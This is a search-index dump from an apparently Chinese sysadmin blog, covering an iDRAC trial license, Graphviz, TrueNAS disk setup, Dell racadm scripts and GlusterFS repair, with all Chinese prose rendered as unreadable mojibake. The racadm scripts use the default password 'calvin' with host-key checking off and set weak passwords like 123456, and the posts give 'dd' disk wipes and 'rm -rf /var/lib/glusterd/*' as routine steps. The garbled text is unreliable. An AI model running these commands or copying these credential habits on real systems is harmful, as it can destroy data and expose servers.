101oywwKjAJBgNVHRMEAjAAMB0GA1UdDgQWBBQAoZ7yMjDHMAFtmmmO/zyz3BJ6hjAN 102BgkqhkiG9w0BAQUFAAOCAQEAHHgoOg57S+lAEejahdBE1HMwe6BF3b9bzUMCynn9 1037buXa3cnRFO3H3674WKU6nBjv4nkT3qMyXwgi7MvXcu69msK4eM6QA8XeC7G1rD+ 1042bb/ENR9R9Zo0BWLym/ij8uUA/BzX8hnbzWxN82+FMdY9WD4fJAJwJ5ZPEbU1Vfy 1057wOWosHgDPXjeAhlhkxDQi6vlRTJdfED6tBY7iGD4AQXfzrHzAZpZlIvKbM2c54B 10665wMSlqfEWMBDhT5qcwGCq82hmi7/sCtu9Z20g2s9F0fp4XlGX8L7l0hCa46zjay 10737GffYsScEDFg/DmkIpcXnGzyx8l1msLzpj8Gt4zHhPlgA==\u0026lt;/dsig:X509Certificate\u0026gt; 108\u0026lt;/dsig:X509Data\u0026gt; 109\u0026lt;/dsig:KeyInfo\u0026gt; 110\u0026lt;/dsig:Signature\u0026gt;\u0026lt;/lns:LicenseClass\u0026gt; æ–‡ä»¶ä¸‹è½½ï¼šiDRAC7_Ent_Trial.xml ","date":"2023-04-06","img":"","permalink":"https://rendoumi.com/posts/20230406-dell_idrac/","series":null,"tags":null,"title":"Dellå¾—Idracä¸´æ—¶license"},{"categories":null,"content":"graphvizæ˜¯å¾ˆå¼ºçƒˆçš„æè¿°è¯­è¨€ç»˜å›¾å·¥å…·\nå®‰è£…ï¼š\n1apt install graphviz æˆ– yum install graphviz ç”Ÿæˆpng\n1dot -Tpng hn.gv -o hn.png vi hg.gv\rdigraph MyGraph {\rcompound = true\rmargin=\u0026quot;0,0\u0026quot;\rranksep = 1\rnodesep = 1\rrankdir=LR\r{rank=same;é˜²ç«å¢™;æ—¥å¿—å®¡è®¡}\rsubgraph cluster_app {\rlabel=\u0026quot;æµ·å—åº”ç”¨\u0026quot;\rrankdir=LR\rmargin = 10\r{rank=same;app01;app02}\rapp01 [label=\u0026quot;app01\\nå†…ç½‘ï¼š192.168.0.10\u0026quot;]\rapp02 [label=\u0026quot;app02\\nå†…ç½‘ï¼š192.168.0.11\u0026quot;]\rstorage01 [label=\u0026quot;storage01\\nå†…ç½‘ï¼š192.168.0.30\u0026quot;]\rsubgraph cluster_db {\rstyle = dotted\rlabel=\u0026quot;æ•°æ®åº“ä¸»/å¤‡\u0026quot;\r{rank=same;db02;db01}\rdb01 [label=\u0026quot;db01\\nå†…ç½‘ï¼š192.168.0.20\u0026quot;]\rdb02 [label=\u0026quot;db02\\nå†…ç½‘ï¼š192.168.0.21\u0026quot;]\rdb01 -\u0026gt; db02 [dir=both]\r}\rapp01 -\u0026gt; db01 [splines=true,lhead=cluster_db]\rapp02 -\u0026gt; db01 [splines=true,lhead=cluster_db]\rapp01 -\u0026gt; storage01\rapp02 -\u0026gt; storage01\r}\râ€‹\nsubgraph cluster_wjw {\rlabel=\u0026quot;å«å¥å§”\u0026quot;\rstyle = dotted\rmargin = 10\r{rank=same;front02;front01}\rfront01 [label=\u0026quot;front01\\nå†…ç½‘ï¼š192.168.0.5\u0026quot;]\rfront02 [label=\u0026quot;front02\\nå†…ç½‘ï¼š192.168.0.6\u0026quot;]\rfront01 -\u0026gt; front02 [dir=both]\r}\râ€‹\nå ¡å’æœº [shape=box,style=rounded,color=red,fontname=\u0026quot;wqy-microhei\u0026quot;,fontcolor=black,fontsize=16,label=\u0026quot;å ¡å’æœº\\nå¤–ç½‘ï¼š124.225.67.34\\nå†…ç½‘ï¼š192.168.0.40\u0026quot;]\ré˜²ç«å¢™ [shape=box,style=filled,color=green,fontname=\u0026quot;wqy-microhei\u0026quot;,fontsize=16,label=\u0026quot;é˜²ç«å¢™\\nå¤–ç½‘ï¼š124.225.200.190\\nå†…ç½‘ï¼š192.168.0.181\u0026quot;]\ræ—¥å¿—å®¡è®¡ [shape=box,style=filled,color=green,fontname=\u0026quot;wqy-microhei\u0026quot;, fontsize=16,label=\u0026quot;æ—¥å¿—å®¡è®¡\\nå¤–ç½‘ï¼š124.225.71.204\\nå†…ç½‘ï¼š192.168.0.41\u0026quot;]\rå ¡å’æœº -\u0026gt; é˜²ç«å¢™\ré˜²ç«å¢™ -\u0026gt; æ—¥å¿—å®¡è®¡\ré˜²ç«å¢™ -\u0026gt; app01 [lhead = cluster_app]\rstorage01 -\u0026gt; front01 [ltail = cluster_app, lhead= cluster_wjw]\r}\rç”Ÿæˆçš„å›¾: Ubuntuä¸‹å‘½ä»¤è¡Œæ‰“å¼€è¿™å›¾ xdg-open hn.png\nå‰å®³çš„å·¥å…·ï¼Œç”Ÿæˆçš„æ‰‹ç»˜å›¾ï¼š https://sketchviz.com/new ","date":"2023-04-03","img":"","permalink":"https://rendoumi.com/posts/20230403-graphviz/","series":null,"tags":null,"title":"åˆ©ç”¨graphvizæè¿°è¯­è¨€ç»˜å›¾"},{"categories":null,"content":"ä¹‹å‰å…¬å¸ä¸–çºªäº’è”å’Œæ— é”¡çš„TureNASç°æœ‰ç¡¬ç›˜éƒ½æ˜¯38å—ï¼Œæ»¡é…æ˜¯60å—ï¼Œæ‰€ä»¥éƒ½éœ€è¦æ‰©å®¹ï¼Œæ‰©æ»¡å†å¢åŠ 22å—ã€‚\nTrueNASçš„Raidæ˜¯ä½¿ç”¨çš„RaidZ3ï¼ŒåŸºäºZFSçš„ï¼Œæœ€å¤šå…è®¸3å—ç›˜å\né¦–å…ˆä¼šå»ºç«‹zpoolï¼Œç„¶ååœ¨zpoolé‡Œé¢å¢åŠ vdevï¼Œæ³¨æ„ï¼Œvdevä¸€æ—¦å¢åŠ ï¼Œä¸å¯æ›´æ”¹ã€‚\næˆ‘ä»¬è¿™é‡Œå°±çŠ¯äº†ç¬¬ä¸€ä¸ªé”™è¯¯ï¼Œæ‰€æœ‰vdevçš„ç£ç›˜æ•°é‡æœ€å¥½ç›¸ç­‰ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡åº”è¯¥å…ˆå¢åŠ 30å—ç›˜ï¼Œç„¶åç¬¬äºŒæ¬¡å†å¢åŠ 30å—ï¼Œè¿™æ ·ä¸¤ä¸ªvdevå°±æ˜¯å‡è¡¡çš„\nç°åœ¨æˆ‘ä»¬è¿™ç§çŠ¶å†µï¼Œç¬¬ä¸€ä¸ªvdevæ˜¯38å—ï¼Œç¬¬äºŒä¸ªvdevæ˜¯22å—ï¼Œä¸å¯¹ç­‰äº†ï¼Œä¼šè­¦å‘Š\nå…·ä½“æ·»åŠ æ­¥éª¤å¦‚ä¸‹ï¼š\né¦–å…ˆæµªæ½®å·¥ç¨‹å¸ˆåˆ°ç°åœºåŠ ç›˜ï¼Œç›˜å¿…é¡»åšå¥½æ¸…é™¤ä¿¡æ¯ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤é€šè¿‡\n1dd if=/dev/zero of=/dev/da59 bs=1M count=32 ç„¶åæ’å¥½ç›˜åï¼Œå¿…é¡»é‡å¯Trunasï¼Œæ‰èƒ½æ­£å¸¸è®¤å‡ºç›˜æ¥ï¼Œä¸èƒ½çƒ­æ’æ‹”ï¼ˆå¾ˆå¥‡æ€ªï¼‰ Storage \u0026ndash;\u0026gt; Pools \u0026ndash;\u0026gt; ç‚¹å‡»é½¿è½® \u0026ndash;\u0026gt; Add Vdevs\nç„¶åé€‰ä¸­æ‰€æœ‰å·¦è¾¹çš„Available Disksï¼Œç§»åˆ°å³è¾¹çš„Data VDevs ç„¶åçœ‹æœ€ä¸‹é¢ä¼šç«‹åˆ»å‡ºçº¢è‰²è­¦å‘Šï¼Œæç¤ºä¸¤ä¸ªvdevçš„disksä¸å¯¹ç­‰\nç‚¹å‡»ADD VDEVSï¼Œä¼šå¼¹çª—è­¦å‘Šï¼Œé€‰ä¸­Confirmï¼Œç„¶åç‚¹Continue\nä¼šç»§ç»­å¼¹å‡ºä¸€ä¸ªè­¦å‘Šçª—ï¼Œè¿™å›å°±æ˜æ™°äº†ï¼Œæ—§çš„æ•°æ®ä¸ä¼šç ´åï¼Œç„¶åç»§ç»­é€‰ä¸­Confirmï¼Œç„¶åç‚¹ADD VDEVS\nç„¶åå°±ä¼šå¼€å§‹åˆå§‹åŒ–ç¡¬ç›˜\næœ€åæŸ¥çœ‹zpoolï¼Œçœ‹åˆ°æœ‰ä¸¤ä¸ªRAIDZ3ï¼Œå°±åŠ å¥½äº†\n","date":"2023-03-31","img":"","permalink":"https://rendoumi.com/posts/20230331-truenas_adddisk/","series":null,"tags":null,"title":"TrueNASç³»ç»Ÿå¦‚ä½•å¢åŠ æ–°ç¡¬ç›˜"},{"categories":null,"content":"æ”¶å½•ä¸€ä¸‹ dell æœåŠ¡å™¨ idrac æ“ä½œå¸¸ç”¨è„šæœ¬\næ˜¾ç¤ºRaidå¡ç¡¬ç›˜\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get controllers\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get vdisks\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get pdisks æ¸…ç†Foreignç£ç›˜çŠ¶æ€\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm storage clearconfig:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\råˆ é™¤vdisk\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.14 racadm raid deletevd:Disk.Virtual.0:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\rå»ºç«‹Raid0\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r0 -wp wb -rp ra -name raid_0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\rå»ºç«‹Raid5\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r5 -wp wb -rp ra -name raid_5 -pdkey:Disk.Bay.1:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\ré‡å¯æœåŠ¡å™¨\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\rè®¾ç½®ç¡¬ç›˜ç¬¬ä¸€å¯åŠ¨ï¼Œç¦æ­¢F1/F2ç­‰å¾…\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.biosbootsettings.BootSeq HardDisk.List.1-1,NIC.Integrated.1-1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.16 racadm jobqueue create BIOS.Setup.1-1 sshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\rè®¾ç½®vnc\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.enable Enabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.Password calvin\rè®¾ç½®idracå…¶ä»–ç”¨æˆ·\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminUserName -i 4 newuser\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 123456\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPrivilege -i 4 0x000001ff\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminEnable -i 4 1\ræ”¹æ‰å¯†ç \rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 987654\rNTPçš„è®¾ç½®\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.ipv4static.dns1 8.8.8.8\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 0.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 1.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 2.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 129.250.35.250\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 180.211.88.50\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 202.112.29.82\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPEnable Enabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPMaxDist 16\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.time.timezone Japan\rä¿®æ”¹ç½‘å¡å¯åŠ¨ä¸ºLegacy PXE\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set nic.nicconfig.1.legacybootproto PXE\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create NIC.Integrated.1-1-1\ripmitool -I lanplus -H $ip -U root -P calvin chassis power reset ","date":"2023-03-31","img":"","permalink":"https://rendoumi.com/posts/20230331-idrac_dell/","series":null,"tags":null,"title":"DellæœåŠ¡å™¨idracå¸¸ç”¨æ“ä½œè„šæœ¬"},{"categories":null,"content":"æ— é”¡æµªæ½®TrueNASç³»ç»Ÿçš„å®‰è£…\nè¿™ä¸€ç‰ˆçš„æµªæ½®å®šåˆ¶NASæœºå™¨æ¯”è¾ƒç‰¹åˆ«ï¼Œæ²¡æœ‰ä»»ä½•Raidå¡ï¼Œé…äº†Avagoçš„ä¸€å—pcie sasç›´é€šå¡ï¼šæé€š9400å¡\nç„¶åæ˜¯å®šåˆ¶æœºï¼Œæ•´ä½“4Uçš„é«˜åº¦ï¼Œæ»¡é…æ˜¯60å—16Tçš„å¤§ç›˜ï¼Œä¸»æ¿åœ¨æœºç®±ä¾§é¢ç«‹ç€ï¼Œ2å—å°ç›˜åšç³»ç»Ÿã€‚\nç”±äºæœºæˆ¿é™åˆ¶ï¼Œæ— æ³•ç›´æ¥ä»æœ¬åœ°è®¿é—®10.18.30.97ï¼Œå¯¼è‡´æ— æ³•å°†æœ¬åœ°æ–‡ä»¶æŒ‚å…¥idracçš„cdromï¼Œåªèƒ½æ›²çº¿æ•‘å›½ï¼Œåœ¨172.18.31.2å»ºç«‹ä¸€ä¸ªnfs shareï¼ŒæŠŠå…‰ç›˜æ–‡ä»¶æ”¾è¿›å»\nåˆ° idrac çš„ Remote control ï¼Œ å†åˆ°Virtual mediaï¼Œé…å¥½nfså…±äº« ip: 172.18.31.2 path: /export/nfsshare\nåœ¨remote image redirctionä¸­å¯ä»¥çœ‹åˆ°å…‰ç›˜æ–‡ä»¶ï¼Œç‚¹å‡»Start\nç„¶åé‡å¯ï¼ŒCDROMæ˜¯ç¬¬ä¸€å¯åŠ¨åª’ä»‹\nå¼€å§‹å®‰è£…ï¼Œç¼ºçœä¼šè¿›å…¥ç¬¬ä¸€é¡¹è¿›è¡Œå®‰è£…\nç„¶åä¼šæŠ¥è¿™ä¸ªé”™ï¼Œpanic: AP #1 (PHY# 2) failed!\nè§äº†é¬¼äº†ï¼Œå”¯ä¸€çš„åœ°æ–¹å¯èƒ½æ˜¯ä¸»æ¿éƒ¨åˆ†å’Œåšé€šå¡å†²çªï¼Œæˆ‘ä»¬é‡å¯è¿›å…¥BIOSï¼Œåˆ°SATAå’ŒsSATAçš„åœ°æ–¹\næŠŠä¸»æ¿çš„SATAç»™å…³æ‰ï¼Œç¦æ­¢AHCI\nåŒæ ·å…³æ‰sSATAï¼Œä¹Ÿç¦æ­¢AHCI\nç„¶åé‡å¯å®‰è£…TrueNASï¼Œè¿™æ¬¡å°±å¯ä»¥é€šè¿‡äº† å®‰è£…ç›˜é€‰æ‹©å‰ä¸¤å—SSDå°ç›˜ï¼Œ230G openbsdä¼šè‡ªåŠ¨å°†è¿™ä¸¤æ¬¾å°ç›˜åšæˆè½¯Raid\næç¤ºä¼šæŠ¹æ‰ä¸¤å—ç›˜çš„æ‰€æœ‰æ•°æ®\nè¾“å…¥rootçš„å¯†ç \né€‰æ‹©Boot via BIOS\nå»ºç«‹16Gçš„swapç©ºé—´\nç„¶åå°±å¼€å§‹å®‰è£…ï¼Œè¿™é‡Œæ²¡ä»€ä¹ˆåŠ¨é™ï¼Œä¹Ÿæ²¡æœ‰è¿›åº¦æ¡ï¼Œä¼šç­‰å¾ˆä¹…\nå®‰è£…å®Œæˆåä¼šè®©ä½ é‡å¯ï¼Œç„¶åå‡ºæ¥é…ç½®ç•Œé¢\næˆ‘ä»¬é¦–å…ˆè¦é…ç½®ç¬¬äºŒé¡¹ï¼ŒBondingç«¯å£ ç„¶åå†é…ç¬¬ä¸€é¡¹çš„é™æ€IP å†é…ç¬¬å››é¡¹ç¼ºçœè·¯ç”± é…å®Œå°±httpå’Œhttpsæ˜¾ç¤ºæ­£ç¡®åœ°å€\nè¾“å…¥åœ°å€ï¼šhttp://172.18.30.97 ç™»å½•å°±å®Œæˆå®‰è£…äº†\n","date":"2023-03-30","img":"","permalink":"https://rendoumi.com/posts/20230330-truenas_install/","series":null,"tags":null,"title":"TureNASç³»ç»Ÿåœ¨æµªæ½®å®šåˆ¶ç³»ç»Ÿä¸Šçš„å®‰è£…"},{"categories":null,"content":"ç‰¹åˆ«æ³¨æ„ ä¸¤å°GFSä¸»æœº172.18.30.18å’Œ172.18.30.36ä¸Šé¢åŠ¡å¿…é…ç½®/etc/hostsï¼Œå¦åˆ™peerçš„æ—¶å€™ä¼šæœ‰é—®é¢˜\n172.18.30.18 renhe-18-30-18\r172.18.30.18 renhe-18-30-36\rå®¢æˆ·ç«¯å®‰è£… 1yum -y install epel-release 2 3ç„¶å yum install glusterfs-fuse å°±å¯ä»¥äº† æŒ‚è½½ï¼š mount.glusterfs 172.18.30.18:/borui-vol /data/br/nfs\nfstab è‡ªåŠ¨æŒ‚è½½ 172.18.30.18:/borui-vol /data/br/nfs glusterfs defaults,_netdev,backupvolfile-server=172.18.30.36 0 0\nåœ¨172.18.30.18ä¸Šå»ºç«‹æ–°å·ï¼Œå› ä¸ºåªæœ‰2ä¸ªèŠ‚ç‚¹ï¼Œå°±å¿…é¡»forceäº† 1gluster volume create test-zhichi-vol replica 2 transport tcp 172.18.30.18:/glusterfs/test-zhichi-vol 172.18.30.36:/glusterfs/test-zhichi-vol force å¯åŠ¨ gluster volume start test-zhichi-vol\næŸ¥çœ‹ä¸€ä¸‹ gluster volume info test-zhichi-vol\næŸ¥çœ‹å·ä¿¡æ¯(ç¦æ­¢æŸ¥çœ‹inodeï¼Œå¤ªå¤šäº†) 1gluster volume status test-zhichi-vol detail 2gluster volume status test-zhichi-vol clients 3gluster volume status test-zhichi-vol mem 4gluster volume status test-zhichi-vol fd 5gluster volume status test-zhichi-vol inode å¼€å¯é™é¢ 1gluster volume quota test-zhichi-vol enable 2gluster volume quota test-zhichi-vol limit-usage / 50GB 3gluster volume quota test-zhichi-vol list é™åˆ¶IPè®¿é—® ä¾‹å¦‚å…è®¸172.18.31.*ç½‘æ®µçš„ä¸»æœºè®¿é—®rep-volumeï¼š\ngluster volume set test-zhichi-vol auth.allow 172.18.31.*`\nå¦‚æœå®¢æˆ·ç«¯æƒ³ç”¨NFSæŒ‚è½½ gluster volume set test-zhichi-vol nfs.disable off\nå¼€å¯æ€§èƒ½åˆ†æï¼ˆæ…ç”¨ï¼‰ gluster volume profile test-zhichi-vol start\nå¼€å¯åæ€§èƒ½åˆ†æåï¼Œæ˜¾ç¤ºI/Oä¿¡æ¯: gluster volume profile gv0 info\nGlusterd å¯åŠ¨å¤±è´¥ï¼ŒåŸå› æœªçŸ¥å¤„ç†åŠæ³•ï¼ˆæ…ç”¨ï¼Œæ‹·å‡ºæ•°æ®åå†ç”¨ï¼‰ï¼š 1rm -rf /var/lib/glusterd/* 2systemctl start glusterd è„‘è£‚è§£å†³æ–¹æ³•ï¼š è„‘è£‚ï¼š ä½¿ç”¨replicaæ¨¡å¼çš„æ—¶å€™ï¼Œå¦‚æœå‘ç”Ÿç½‘ç»œæ•…éšœï¼ˆæ¯”å¦‚äº¤æ¢æœºåäº†ã€ç½‘çº¿è¢«ç¢°æ‰äº†ï¼‰ï¼Œè€Œä¸¤å°æœºå™¨éƒ½è¿˜æ´»ç€çš„æ—¶å€™ï¼Œå®ƒä»¬å„è‡ªçš„æ•°æ®è¯»å†™è¿˜ä¼šç»§ç»­ã€‚\nå½“ç½‘ç»œæ¢å¤æ—¶ï¼Œå®ƒä»¬éƒ½ä¼šè®¤ä¸ºè‡ªå·±çš„æ•°æ®æ‰æ˜¯æ­£ç¡®çš„ï¼Œå¯¹æ–¹çš„æ˜¯é”™è¯¯çš„ï¼Œè¿™å°±æ˜¯ä¿—ç§°çš„è„‘è£‚ã€‚\nåŒæ–¹è°éƒ½ä¸è‚¯å¦¥åï¼Œç»“æœå°±æ˜¯æ–‡ä»¶æ•°æ®è¯»å–é”™è¯¯ï¼Œç³»ç»Ÿæ— æ³•æ­£å¸¸è¿è¡Œã€‚ åœ¨æ­£å¸¸çš„æœºå™¨ä¸Šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š\n1gluster volume status nfsp ï¼ˆçœ‹çœ‹è¿™ä¸ªèŠ‚ç‚¹æœ‰æ²¡æœ‰åœ¨çº¿ï¼‰ 2gluster volume heal nfsp full ï¼ˆå¯åŠ¨å®Œå…¨ä¿®å¤ï¼‰ 3gluster volume heal nfsp info ï¼ˆæŸ¥çœ‹éœ€è¦ä¿®å¤çš„æ–‡ä»¶ï¼‰ 4gluster volume heal nfsp info healed ï¼ˆæŸ¥çœ‹ä¿®å¤æˆåŠŸçš„æ–‡ä»¶ï¼‰ 5gluster volume heal nfsp info heal-failed ï¼ˆæŸ¥çœ‹ä¿®å¤å¤±è´¥çš„æ–‡ä»¶ï¼‰ 6gluster volume heal nfsp info split-brain ï¼ˆæŸ¥çœ‹è„‘è£‚çš„æ–‡ä»¶ï¼‰ 1Gathering Heal info on volume nfsp has been successful 2 3Brick gls03.mycloud.com.cn:/glusterfs/nfsp 4Number of entries: 24 5 6at path on brick 7----------------------------------- 8 92014-05-30 10:22:20 /36c741b8-2de2-46e9-9e3c-8c7475e4dd10 10ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ 11ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ 12ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ åœ¨æœ‰ç—…çš„é‚£å°æœºå™¨ä¸Šï¼Œåˆ é™¤è„‘è£‚çš„æ–‡ä»¶ï¼š ï¼ˆæ³¨æ„ï¼è¦åˆ é™¤çš„æ–‡ä»¶æ˜¯åœ¨gluster volume info nfspçœ‹åˆ°çš„ç›®å½•ä¸­ï¼Œä¸è¦å»åˆ é™¤æŒ‚è½½çš„ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œä¸ç„¶å°±ç­‰ç€å“­å§ï¼‰ æŠŠç¡¬é“¾æ¥æ–‡ä»¶æ‰¾å‡ºæ¥ï¼Œä¹Ÿè¦åˆ é™¤ï¼š\n1find /glusterfs/nfsp/ -samefile /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 -print /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 /glusterfs/nfsp/.glusterfs/65/26/6526e766-cb26-434c-9605-eacb21316447 ï¼ˆè¿™é‡Œçœ‹å¾—å‡ºç¡¬é“¾æ¥æ–‡ä»¶çš„ç›®å½•åå’Œæ—¥å¿—ä¸­çš„gfidçš„å¯¹åº”å…³ç³»ï¼‰\nåˆ é™¤æ‰ï¼š\n1rm /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 2rm /glusterfs/nfsp/.glusterfs/65/26/6526e766-cb26-434c-9605-eacb21316447 åœ¨æ­£å¸¸çš„æœºå™¨ä¸Šæ‰§è¡Œ\n1tail -1 /nfsprimary/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 ï¼ˆè¯»ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œè§¦å‘ä¿®å¤ï¼‰ 2ls -l /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 äººå·¥æŸ¥çœ‹ä¸€ä¸‹ä¸¤å°æœºå™¨çš„æ•°æ®æ˜¯å¦ä¸€è‡´\nå…¶å®ƒçš„è„‘è£‚æ–‡ä»¶ä¹Ÿæ˜¯ä¸€æ ·å¤„ç†ã€‚ æ²¡é—®é¢˜çš„è¯ï¼Œé‡æ–°æŒ‚è½½ç›®å½•:\n1umount /nfsprimary 2/bin/mount -t glusterfs 10.10.10.21:/nfsp /nfsprimary/ ","date":"2023-03-30","img":"","permalink":"https://rendoumi.com/posts/20230330-glusterfs/","series":null,"tags":null,"title":"GlusterFSçš„å®é™…åº”ç”¨"},{"categories":null,"content":"çªç„¶æ¥çš„ä¸ªéœ€æ±‚ï¼Œè¦æ±‚å±è”½å›½å¤–çš„ç”¨æˆ·ç™»å½•å…¬å¸çš„openvpnï¼Œé˜²æ­¢æ»¥ç”¨ï¼Œæœäº†ä¸€ä¸‹æ•™ç¨‹å€’æ˜¯çœŸä¸å°‘ï¼Œé—®é¢˜ä¸å°‘éƒ½æ˜¯è¦å»ä¸‹è½½é‚£ä¸ªæ— 